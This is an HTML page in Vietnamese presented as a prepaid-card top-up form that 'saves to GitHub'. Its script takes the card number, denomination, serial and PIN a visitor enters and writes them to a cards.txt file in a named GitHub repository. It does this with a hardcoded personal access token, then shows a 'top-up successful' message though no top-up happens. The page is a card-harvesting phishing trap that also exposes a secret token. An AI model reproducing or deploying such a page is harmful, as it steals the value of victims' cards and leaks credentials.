<!DOCTYPE html>
<html>
<head>
    <script>
        function saveCard() {
            // Lấy thông tin từ các trường nhập liệu
            var cardNumber = document.getElementById("cardNumber").value;
            var cardValue = document.getElementById("cardValue").value;
            var cardSerial = document.getElementById("cardSerial").value;
            var cardPin = document.getElementById("cardPin").value;

            // Tạo nội dung tệp mới chứa thông tin thẻ
            var fileContent = "Số thẻ: " + cardNumber + "\nMệnh giá: " + cardValue + "\nSố serial: " + cardSerial + "\nMã PIN: " + cardPin;

            // Sử dụng API của GitHub để tạo tệp mới
            fetch("https://api.github.com/repos/YTHzgamer/YTHzgamer.github.io/contents/cards.txt", {
                method: "PUT",
                headers: {
                    "Authorization": "Bearer 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"
                },
                body: JSON.stringify({
                    message: "Add new card",
                    content: btoa(fileContent)
                })
            })
            .then(response => response.json())
            .then(data => alert("Nạp thẻ thành công!"))
            .catch(error => console.error(error));
        }
    </script>
    <title>Nạp thẻ chậm và lưu vào GitHub</title>
</head>
<body>
    <h1>Nạp thẻ chậm và lưu vào GitHub</h1>

    <form>
        <label for="cardNumber">Số thẻ:</label>
        <input type="text" id="cardNumber" name="cardNumber"><br>

        <label for="cardValue">Mệnh giá:</label>
        <select id="cardValue" name="cardValue">
            <option value="10000">10,000 VNĐ</option>
            <option value="20000">20,000 VNĐ</option>
            <option value="50000">50,000 VNĐ</option>
            <option value="100000">100,000 VNĐ</option>
        </select><br>

        <label for="cardSerial">Số serial:</label>
        <input type="text" id="cardSerial" name="cardSerial"><br>

        <label for="cardPin">Tên người dùng:</label>
        <input type="text" id="cardPin" name="cardPin"><br>

        <input type="button" value="Nạp thẻ" onclick="saveCard()">
    </form>
</body>
</html>
